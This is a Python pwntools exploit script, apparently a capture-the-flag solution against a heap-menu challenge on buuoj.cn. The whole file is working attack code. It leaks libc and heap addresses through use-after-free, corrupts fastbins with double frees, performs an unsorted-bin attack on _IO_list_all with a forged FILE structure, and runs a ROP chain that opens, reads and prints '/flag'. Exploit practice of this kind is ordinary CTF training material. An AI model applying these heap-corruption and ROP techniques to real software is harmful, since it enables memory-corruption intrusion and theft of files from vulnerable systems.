from pwn import *
def cmd(c):
	p.sendlineafter(">> ",str(c))
def add(size,c="Y"):
	cmd(1)
	p.sendlineafter("?\n",str(size))
	p.sendafter("?\n",c)
def free(idx):
	cmd(2)
	p.sendlineafter("?\n",str(idx))
def show(idx):
	cmd(3)
	p.sendlineafter("?\n",str(idx))
context.log_level='debug'
context.arch='amd64'
one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]
one = one_gadget[2]
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
p=remote("buuoj.cn",25942)
#p=process('./pwn')
#raw_input()
name="A"*0x1
p.sendlineafter("? \n",name)
add(0x88,p64(0x71)*17)#0
add(0x68,p64(0x21)*5+p64(0x71))#1
add(0x68,p64(0x21)*13)#2
add(1)#
free(0)
show(0)
base=u64(p.readline()[:-1].ljust(8,'\x00'))-(0x7ffff7dd1b78-0x7ffff7a0d000)

libc.address=base
add(0x68,p64(0x71)*13)#4
free(1)
free(2)
show(2)
heap=u64(p.readline()[:-1].ljust(8,'\x00'))-0x90
free(1)
syscall=0x00000000000bc375+base
fio=heap+0x70
fake =p64(fio+0x8)+p64(syscall)
fake =fake.ljust(0x20,'\x00')+p64(1)
fake =fake.ljust(0x38,'\x00')+p64(fio+0xd8-0x10)+p64(0x47b75+base)
add(0x68,p64(heap+0x60))#5
add(0x68,fake)#6 0x100
add(0x68)#7 0x90
add(0x68,flat(0,0x61))#8 0x60 overlap
add(0x78,p64(0x71)*15)#9 FAKE IO




free(5)
free(4)
free(5)
add(0x68,p64(fio-0x10))#10
add(0x68)#11
add(0x68)#12


fake = p64(heap+0x220-0x60)+p64(0x61)+p64(0x47b75+base)+p64(0)+p64(0)+p64(1)
add(0x68,fake)#13




regs=flat(heap+0x220-0x60,0,heap+0x400,0,0,0x100)
regs=regs.ljust(0xa8-0x60,'\x00')+p64(syscall)
add(0x100,regs)#14
add(0x68)#15
free(14)
free(15)
free(0)
free(15)

add(0x68,p64(heap+0x200))
add(0x68)
add(0x68)
add(0x68,p64(0)+p64(0x21)+p64(0)+p64(libc.sym['_IO_list_all']-0x10))
add(0x18)

free(15)
free(0)
free(15)
add(0x68,p64(heap+0xc0))
add(0x68)
add(0x68)
add(0x68,p64(syscall)+p64(0)+p64(heap+0x78)+p64(0)*2+p64(0x100))

#gdb.attach(p,'b *0x7ffff7a89193')

cmd(4)
#1. set small bin
#2. unsorted bin attack

rax=0x0000000000033544+base
rdi=0x0000000000021102+base
rsi=0x00000000000202e8+base
rdx=0x0000000000001b92+base


rop=flat(rsi,heap+0x150,rdi,0,rdx,0,rax,257,syscall,rdi,3,rsi,heap+0x300,rdx,0x30,rax,0,syscall,rdi,1,rsi,heap+0x300,rdx,0x30,rax,1,syscall)
p.send(rop+"/flag\x00")
log.warning(hex(base))
log.warning(hex(heap))
p.interactive('n132>')
